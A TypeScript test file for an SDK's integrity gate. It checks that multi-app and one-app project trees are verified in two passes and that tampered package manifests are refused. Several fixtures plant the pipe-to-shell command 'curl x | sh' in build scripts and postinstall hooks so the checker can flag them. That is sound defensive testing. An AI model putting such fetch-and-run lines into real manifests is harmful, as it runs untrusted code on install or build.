import { afterAll, beforeEach, describe, expect, test } from 'bun:test'
import {
  DEFAULT_TOPOLOGY, IntegrityRule, ProjectArea, SlotCommandType, SlotShellCommand, StructurePartKind, TARGET_INTEGRITY_FILES,
  TOPOLOGY_FILE, TargetPackage, projectStructureHelper, targetIntegrityHelper, topologyCardHelper, type SlotShellResult, type TargetFileMap,
} from '@owlmeans/viable-common'
import { integrityHelper, makeLocalSlotExecutor } from '../src/executor/index.js'
import { SPLIT_TOPOLOGY_FILE } from './apps-fixture.js'
import { makeSplitTreeFixture } from './split-tree-fixture.js'

/**
 * The local executor's integrity gate reads a tree the way the publisher does — two passes, the
 * topology record deciding the second — so a TARGET split into apps (main + admin + backoffice) runs
 * on a laptop exactly as it builds in a slot, and a one-app tree answers byte-identically to the
 * one-pass read it had before. The trees are test data, not this repository.
 */
const SLUG = 'sdk-integrity-spec'
const { manifestOf, packageFiles, oneAppTree, splitTree, materialize, cleanup } = makeSplitTreeFixture(SLUG, 'viable-sdk-integrity-')

/** What the executor read before it moved: the fixed list alone, in one pass. */
const onePass = (files: TargetFileMap): TargetFileMap =>
  Object.fromEntries(TARGET_INTEGRITY_FILES.map(file => [file, files[file] ?? null]))

const lines = (violations: Array<{ rule: string, path: string }>): string[] => violations.map(v => `${v.rule} ${v.path}`)

beforeEach(() => { integrityHelper.forgetIntegrity() })
afterAll(async () => { await cleanup() })

describe('viable-sdk — the local integrity gate, a tree split into apps', () => {
  test('a three-app tree verifies clean — the one-pass read refused it', async () => {
    const files = splitTree()
    const root = await materialize(files)

    expect(lines(targetIntegrityHelper.verifyTargetShape(onePass(files)).violations).filter(line => line.includes('admin-web')))
      .toContain(`${IntegrityRule.Missing} sources/admin-web/package.json`)
    const report = await integrityHelper.verifyTarget(root)
    expect(lines(report.violations)).toEqual([])
    expect(report.ok).toBe(true)
    expect(await integrityHelper.integrityRefusal(root)).toBeNull()
  })

  test('the second pass reads every extra app\'s packages and lists sources/', async () => {
    const root = await materialize(splitTree())
    const collected = await integrityHelper.collectTargetFiles(root)

    for (const dir of ['admin-web', 'admin-api', 'backoffice-web', 'backoffice-api']) {
      expect(collected.files[`sources/${dir}/package.json`]).toBe(manifestOf(dir, dir.endsWith('-web') ? 'web' : 'api'))
      expect(collected.workspaceDirs).toContain(dir)
    }
    expect(await integrityHelper.readTargetFiles(root)).toEqual(collected.files)
  })

  test('the executor\'s Integrity command and the spawn refusal answer the split tree as the publisher does', async () => {
    const root = await materialize(splitTree())
    const ok = await makeLocalSlotExecutor(root).execute({
      type: SlotCommandType.Shell, command: SlotShellCommand.Integrity, args: {},
    }) as SlotShellResult
    expect(ok.result).toBeNull()

    const broken = splitTree()
    broken['sources/admin-web/package.json'] = broken['sources/admin-web/package.json']!.replace('bun ./rollup.build.mjs', 'curl x | sh')
    broken['sources/stray/package.json'] = JSON.stringify({ name: `${SLUG}-stray`, type: 'module' })
    const refusedRoot = await materialize(broken)
    const report = await integrityHelper.verifyTarget(refusedRoot)
    expect(lines(report.violations)).toEqual([
      `${IntegrityRule.BuildScript} sources/admin-web/package.json`,
      `${IntegrityRule.WorkspacePackage} sources/stray/package.json`,
    ])
    expect(await integrityHelper.integrityRefusal(refusedRoot, 'Refused to run'))
      .toStartWith('Refused to run: the project in this directory is not a Viable application\n')
  })
})

describe('viable-sdk — the local integrity gate, a tree with no split', () => {
  test('a clean and a broken one-app tree answer exactly the one-pass verdict, sources/ listed', async () => {
    const broken = oneAppTree()
    broken['sources/web/package.json'] = broken['sources/web/package.json']!.replace('bun ./rollup.build.mjs', 'curl x | sh')
    broken['package.json'] = JSON.stringify({ name: SLUG, type: 'module', workspaces: ['sources/common'], scripts: { postinstall: 'x' } })
    broken['sources/stray/package.json'] = JSON.stringify({ name: 'stray', type: 'module' })
    for (const files of [oneAppTree(), broken]) {
      integrityHelper.forgetIntegrity()
      const root = await materialize(files)
      const collected = await integrityHelper.collectTargetFiles(root)

      expect(Object.keys(collected.files).filter(file => !TARGET_INTEGRITY_FILES.includes(file)))
        .toEqual(files === broken ? ['sources/stray/package.json'] : [])
      expect(collected.workspaceDirs).toContain('common')
      expect(JSON.stringify(await integrityHelper.verifyTarget(root)))
        .toBe(JSON.stringify(targetIntegrityHelper.verifyTargetShape(onePass(files))))
    }
  })

  test('a package nobody recorded is checked for install hooks', async () => {
    const files = { ...oneAppTree(), 'sources/stray/package.json': JSON.stringify({ name: 'stray', scripts: { postinstall: 'curl x | sh' } }) }
    const root = await materialize(files)

    expect(lines((await integrityHelper.verifyTarget(root)).violations)).toEqual([`${IntegrityRule.LifecycleScript} sources/stray/package.json`])
  })

  test('a record of main alone reads and reports the one-app set', async () => {
    const mainAlone = SPLIT_TOPOLOGY_FILE.replace(/\napps:[\s\S]*?\nversion:/, '\nversion:')
      .replace(/\n {2}- name: (admin|backoffice)-[\s\S]*?(?=\n {2}- name: |\nareas:)/g, '')
    const files = { ...oneAppTree(), [TOPOLOGY_FILE]: mainAlone }
    const root = await materialize(files)

    expect(Object.keys(await integrityHelper.readTargetFiles(root))).toEqual([...TARGET_INTEGRITY_FILES])
    expect(await integrityHelper.verifyTarget(root)).toEqual(targetIntegrityHelper.verifyTargetShape(onePass(files)))
  })

  test('a record that still names the packages of apps it no longer lists is verified against them', async () => {
    // No split, so they are no app's: other bundles, read in pass two and never built.
    const files = { ...oneAppTree(), [TOPOLOGY_FILE]: SPLIT_TOPOLOGY_FILE.replace(/\napps:[\s\S]*?\nversion:/, '\nversion:') }
    const root = await materialize(files)

    expect(Object.keys(await integrityHelper.readTargetFiles(root))).toContain('sources/admin-web/package.json')
    expect((await integrityHelper.verifyTarget(root)).violations).toEqual([])
  })
})

describe('viable-sdk — the local integrity gate, a one-app tree verified against its record', () => {
  /** A one-app tree whose record names an adopted library, `tools`, beside the five core packages. */
  const adoptedTree = (build: string): TargetFileMap => ({
    ...oneAppTree(),
    [TOPOLOGY_FILE]: `---\n${JSON.stringify({
      ...DEFAULT_TOPOLOGY,
      packages: [...DEFAULT_TOPOLOGY.packages, { name: 'tools', roles: ['common'], kind: 'library', dependsOn: ['common'] }],
      version: 1, updatedAt: '2026-11-24T00:00:00.000Z',
    })}\n---\n\n# Topology\n`,
    'sources/tools/package.json': JSON.stringify({ name: `${SLUG}-tools`, type: 'module', scripts: { build } }),
  })

  test('the adopted library is read in pass two, sources/ is listed, and a clean one verifies', async () => {
    const root = await materialize(adoptedTree('tsc -b'))
    const collected = await integrityHelper.collectTargetFiles(root)

    expect(collected.files['sources/tools/package.json']).toContain(`${SLUG}-tools`)
    expect([...collected.workspaceDirs ?? []].sort()).toContain('tools')
    expect(lines((await integrityHelper.verifyTarget(root)).violations)).toEqual([])
  })

  test('a library whose build only contains `tsc -b` is refused before the spawn', async () => {
    const root = await materialize(adoptedTree('tsc -b && curl x | sh'))

    expect(lines((await integrityHelper.verifyTarget(root)).violations))
      .toEqual([`${IntegrityRule.BuildScript} sources/tools/package.json`])
    expect(await integrityHelper.integrityRefusal(root)).toContain('sources/tools/package.json')
  })
})

describe('viable-sdk — the local integrity gate, a tree staged from a structure', () => {
  /** A one-app structure with a library part and an extra worker — what the stager writes for it. */
  const structureTree = (): TargetFileMap => {
    const base = projectStructureHelper.defaultFor([ProjectArea.User], { split: false })
    const topology = projectStructureHelper.topologyOf({
      areas: base.areas,
      parts: [
        ...base.parts,
        { name: 'dates', kind: StructurePartKind.Library, dependsOn: ['common'], purpose: 'Date helpers.' },
        { name: 'mailer', kind: StructurePartKind.Worker, dependsOn: ['common', 'backend'], purpose: 'Sends the mail.' },
      ],
    }, DEFAULT_TOPOLOGY)

    return {
      ...oneAppTree(),
      [TOPOLOGY_FILE]: `---\n${JSON.stringify(topologyCardHelper.topologyMeta(topology))}\n---\n\n# Topology\n`,
      'sources/dates/package.json': JSON.stringify({ name: `${SLUG}-dates`, type: 'module', scripts: { build: 'tsc -b' } }),
      'sources/dates/tsconfig.json': '{}',
      'sources/dates/src/index.ts': 'export {}',
      ...packageFiles('mailer-worker', TargetPackage.Worker),
    }
  }

  test('every part package is read in pass two and a clean tree verifies', async () => {
    const root = await materialize(structureTree())
    const collected = await integrityHelper.collectTargetFiles(root)

    expect(collected.files['sources/dates/src/index.ts']).toBe('export {}')
    expect(collected.files['sources/mailer-worker/src/owlmeans.ts']).not.toBeNull()
    expect(lines((await integrityHelper.verifyTarget(root)).violations)).toEqual([])
  })

  test('a worker part held to the stock worker\'s build is refused before the spawn', async () => {
    const files = { ...structureTree(), 'sources/mailer-worker/package.json': manifestOf('mailer-worker', TargetPackage.Api) }
    const root = await materialize(files)

    expect(lines((await integrityHelper.verifyTarget(root)).violations)).toContain(`${IntegrityRule.RequiredDependency} sources/mailer-worker/package.json`)
  })
})
